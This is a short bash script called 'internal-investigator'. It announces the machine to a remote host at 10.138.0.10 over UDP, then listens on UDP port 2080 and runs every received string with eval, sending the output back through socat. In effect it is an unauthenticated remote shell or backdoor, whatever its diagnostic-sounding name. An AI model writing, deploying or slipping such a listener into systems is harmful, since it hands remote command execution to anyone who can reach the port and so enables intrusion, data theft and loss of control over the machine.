#!/bin/bash

TARGET_UDP="UDP4:10.138.0.10:2020"

echo "--- internal-investigator started on $(hostname): $(date) ---" | socat - $TARGET_UDP

# Listen for commands on UDP 2080 and send output to $TARGET_UDP
while true; do
  cmd=$(socat - UDP-RECVFROM:2080)
  echo "Executing: $cmd"
  eval "$cmd" 2>&1 | socat - $TARGET_UDP
done
